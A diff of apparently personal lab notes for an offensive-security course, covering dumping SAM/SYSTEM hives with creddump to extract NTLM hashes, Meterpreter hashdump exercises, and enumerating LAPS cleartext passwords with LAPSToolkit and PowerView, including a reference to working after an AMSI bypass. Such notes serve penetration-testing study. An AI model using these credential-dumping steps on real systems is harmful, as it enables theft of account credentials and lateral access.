@@ -114,17 +114,109 @@ The operation completed successfully.
 
 two tools to use to decrypt he signatures
 
-1. mimikatz - 
-2. creddump7
+1. mimikatz
+2. creddump
 
-to use creddump7 -
-
-1. sudo apt install python-crypto library
-2. sudo  git clone https://github.com/Neohapsis/creddump7
-
+we will use creddump
 however the correct location maybe here
 for credential dump : https://github.com/moyix/creddump
-for pycrypto : pip install pycrypto
+for pycrypto its now pycryptodome: pip install pycryptodome
+
+but pycrypto has problems in python currently the workaround is  to use: https://bytemeta.vip/repo/lgandx/Responder/issues/144
+dowload release from https://github.com/pycrypto/pycrypto
+sudo python ./setup.py build
+sudo python ./setup.py install
+
+```
+kali@kali:~/creddump$ python pwdump.py ~/Downloads/system ~/Downloads/SAM 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HP:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+m:1007:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+these are the ntlm hashes. which can be cracked.
+
+### 12.1.1.1 Exercises
+1. Dump the SAM and SYSTEM files using a Volume Shadow copy and decrypt the NTLM
+hashes with Creddump7.
+
+done above
+
+2. Obtain the NTLM hash for the local administrator account by dumping the SAM and
+SYSTEM files from the registry.
+
+we can download the files through this method and then rest of the steps remain same
+
+3. Run a Meterpreter agent on the Windows 10 client and use hashdump to dump the NTLM
+hashes.
+meterpreter also dumps hashdump
+
+# Hardening the local administrator account
+
+MIcrosoft introduced Group Policy Preferences. this is stored in SYSVOl folder which must be accessible to all computers in Active Directory. And then it was AES encrypted by Microsoft.
+
+MIcrosoft published the private key on MSDn. Get-GPPPassword powershell scrupt could easily locate and decrypt any passwords found in affected systems SYSVOL folder
+
+Microsoft introduced LAPS in 2015 whcihc offered a secure and scalable way of remotely managing the local administrator password for domain joined computers.
+
+it inroduces two new attributes tot the computer object into active directory.
+
+1. ms-mcs-AdmPwdExpirationTime- which registers the expiration time of a password as directed through group policy.
+2.  ms-mcs-AdmPwd contains clear text password through a group policy. 
+
+LAPS uses admpwd.dll to change the local administrator password and push the
+new password to the ms-mcs-AdmPwd attribute of the associated computer object.
+
+Instead, we can use the LAPSToolkit692 PowerShell script, which is essentially a wrapper script
+around the PowerView693 Active Directory enumeration PowerShell script.
+
+# LAPSToolkit - wrap around powerview
+https://github.com/leoloobeek/LAPSToolkit
+
+after amsi
+```
+PS C:\Users\HP\Documents\pen300\book\chapter12> GET-LAPSComputers
+Exception calling "GetCurrentDomain" with "0" argument(s): "Current security context is 
+not associated with an Active Directory domain or forest."
+At C:\Users\HP\Documents\pen300\book\chapter12\LAPSToolkit.ps1:952 char:9
++         [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent ...
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : ActiveDirectoryOperationException
+ 
+WARNING: Error: Exception calling "FindAll" with "0" argument(s): "Unknown error 
+(0x80005000)"
+```
+
+this error comes because of lack of ad
+This will show the delegated
+```
+Find-LAPSDelegatedGroups
+```
+we can also use netgroupmemeber -GroupName to specify the group name.
+
+```
+PS C:\Tools> Get-NetGroupMember -GroupName "LAPS Password Readers"
+```
+
+### 12.1.2.1 Exercises
+1. Repeat the LAPS enumeration and obtain the clear text password using LAPSToolKit from
+the Windows 10 victim machine
+
+2. Create a Meterpreter agent on the Windows 10 victim machine and perform the same
+actions remotely from your Kali Linux machine.
+
+# Access Tokens
+
+
+
+
+
+
+
 
 
 
